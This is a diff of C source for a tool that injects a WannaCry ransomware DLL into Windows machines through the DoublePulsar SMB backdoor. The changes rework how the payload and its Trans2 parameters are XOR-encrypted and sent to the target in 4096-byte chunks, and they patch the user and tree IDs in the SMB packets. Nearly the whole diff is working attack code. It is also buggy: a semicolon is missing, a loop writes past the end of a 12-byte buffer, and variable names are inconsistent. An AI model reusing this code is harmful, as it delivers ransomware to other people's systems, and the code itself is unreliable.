@@ -144,6 +144,14 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int
 	DWORD totalPayloadSize_x86 = 0x4060 + 0x1305 + WannacryFileSize;
 	DWORD totalPayloadSize_x64 = 0xc8a4 + 0x1800 + WannacryFileSize;
 	*/
+
+
+	unsigned char byte_xor_key[5];
+	byte_xor_key[0] = (unsigned char)XorKey;
+	byte_xor_key[1] = (unsigned char)(((unsigned int)XorKey >> 8) & 0xFF);
+	byte_xor_key[2] = (unsigned char)(((unsigned int)XorKey >> 16) & 0xFF);
+	byte_xor_key[3] = (unsigned char)(((unsigned int)XorKey >> 24) & 0xFF);
+
 	
 	/*
 	/*
@@ -260,32 +268,46 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int
 	*/
 	
 	int ctx = 0; //offset counter
-	char Parametersbuffer[12];
+	unsigned char Parametersbuffer[12];
 	
 	//the payload size doesn't change, but this is determined by the shellcode + DLL payload
 	//change this to dynamically change based on the size of the payload
-	unsigned int xor_payload_size = total_size ^ xkey; 
-	unsigned int chunk_size = 4096 ^ xkey; //chunk size but encrypted with XOR key
-	unsigned int o_offset = 0 ^ xkey; //offset counter but encrypted with XOR key
+	unsigned int chunk_size = 4096;
+	unsigned int OffsetofChunkinPayload = 0; 
 	unsigned int bytesLeft = total_size; //Bytes Left counter
 	//WILL verify why wannacry in IDA says: shellcode_payload_size + DLLSize + 12
 	//OR use this:
 	//unsigned int bytesLeft = sizeof(hMem)/sizeof(hMem[0]);
+
+	for (i = 0; i < payload_totalsize; i++)
+	{
+		hMem[i] ^= byte_xor_key[i % 4];
+	}
+
+	
 	if(total_size / 4096 > 0)
 	{
 		for(i=0; ; ctx=i)
 		{
-			o_offset = ctx ^ xkey;
-			memcpy(Parametersbuffer, (char*)&xor_payload_size, 4);
-			memcpy(Parametersbuffer + 4, (char*)&chunk_size, 4);
-			memcpy(Parametersbuffer + 8, (char*)&o_offset, 4);
+			memset(Parametersbuffer, 0x00, 12);
+		    memcpy((unsigned char*)Parametersbuffer, (unsigned char*)&TotalSizeOfPayload, 4);
+		    memcpy((unsigned char*)Parametersbuffer + 4, (unsigned char*)&ChunkSize, 4);
+		    memcpy((unsigned char*)Parametersbuffer + 8, (unsigned char*)&OffsetofChunkinPayload, 4);
+
+			for (i = 0; i < 13; i++)
+			{
+				Parametersbuffer[i] ^= byte_xor_key[i % 4];
+			}
 			
-			//size 70
-			memcpy(send_buffer, wannacry_Trans2_Request, sizeof(wannacry_Trans2_Request));
-			//copy parameters
-			memcpy(send_buffer + 70 , Parametersbuffer, 12);
-			//copy 4096 bytes of payload
-			memcpy(send_buffer + 82, (char *)hMem + ctx, 4096);
+			//copy wannacry skeleton packet to big Trans2 packet
+			memcpy((unsigned char*)send_buffer, (unsigned char*)wannacry_Trans2_Request, 70);
+
+			//copy parameters to big packet at offset 70 ( after the trans2 exec packet )
+			memcpy((unsigned char*)send_buffer + 70, (unsigned char*)Parametersbuffer, 12);
+
+			//copy encrypted payload
+			memcpy((unsigned char*)send_buffer + 82, (unsigned char*)hMem + ctx, ChunkSize);
+
 			send(socket, (char*)send_buffer, 4178, 0);
 			recv(socket, (char*)recv_buffer, 4096, 0);
 			if(recvbuff[34] != 82)
@@ -294,29 +316,32 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int
 				break;
 			}
 			ctx += 4096; //increment counter 
+			OffsetofChunkinPayload += 4096;
 			bytesleft -= 4096; //tracker to see how many bytes we have left
 		}
 	}
 	
 	if ( v10 > 0 )
 	{
-		//update chunk size to what's left in the encrypted payload buffer
-		chunk_size = bytesLeft ^ xkey;
-		//update offset by XORing the latest value
-		o_offset = ctx ^ xkey;
-		memcpy(Parametersbuffer, (char*)&xor_payload_size, 4);
-		memcpy(Parametersbuffer + 4, (char*)&chunk_size, 4);
-		memcpy(Parametersbuffer + 8, (char*)&o_offset, 4);
-		//parameters are copied accurately to the buffer
+		memset(Parametersbuffer, 0x00, 12);
+		memcpy((unsigned char*)Parametersbuffer, (unsigned char*)&TotalSizeOfPayload, 4);
+		memcpy((unsigned char*)Parametersbuffer + 4, (unsigned char*)&remainder, 4);
+		memcpy((unsigned char*)Parametersbuffer + 8, (unsigned char*)&OffsetofChunkinPayload, 4);
+
+		for (i = 0; i < 13; i++)
+		{
+			Parametersbuffer[i] ^= byte_xor_key[i % 4];
+		}
+		
 		
 		//size 70
-		memcpy(send_buffer, wannacry_Trans2_Request, sizeof(wannacry_Trans2_Request));
+		memcpy((unsigned char*)send_buffer, (unsigned char*)wannacry_Trans2_Request, 70);
 		//update last packet SMB Length
 		unsigned short smblen;
-		smblen = bytesLeft+70+12; //BytesLeft + DoublePulsar Exec Packet Length + Trans2 SESSION_SETUP parameters - 4 since netBIOS isn't counted
+		smblen = bytesLeft + 70 + 12 - 4; //BytesLeft + DoublePulsar Exec Packet Length + Trans2 SESSION_SETUP parameters - 4 since netBIOS isn't counted
 		unsigned short smb_length_value = htons(smblen);
 		//memcpy(buffer+2, &smblen, 2);
-		memcpy(buffer+2, &smb_length_value, 2);
+		memcpy(buffer + 2, &smb_length_value, 2);
 
 		//copy parameters
 		memcpy(send_buffer + 70 , Parametersbuffer, 12);
@@ -364,19 +389,19 @@ int runPayloadOnTarget(char *host, u_short hostshort)
 	userid[1] = recvbuff[33];
 	
 	//update userID in the tree connect request
-    	treeConnectRequest[32] = userid[0];
-    	treeConnectRequest[33] = userid[1];
+    treeConnectRequest[32] = userid[0];
+    treeConnectRequest[33] = userid[1];
 	send(dsock, (char*)treeConnectRequest, sizeof(treeConnectRequest) - 1, 0);
 	recv(dsock, (char*)recvbuff, sizeof(recvbuff), 0);
 	
 	//copy treeID from recvbuff @ 28, 29
-    	treeid[0] = recvbuff[28];
+    treeid[0] = recvbuff[28];
    	treeid[1] = recvbuff[29];
 	
 	trans2_session_setup[28] = treeid[0];
-        trans2_session_setup[29] = treeid[1]
-        trans2_session_setup[32] = userid[0];
-        trans2_session_setup[33] = userid[1];
+    trans2_session_setup[29] = treeid[1]
+    trans2_session_setup[32] = userid[0];
+	trans2_session_setup[33] = userid[1];
 
 	send(dsock, (char*)trans2_session_setup, sizeof(trans2_session_setup) - 1, 0);
 	recv(dsock, (char*)recvbuff, sizeof(recvbuff), 0);
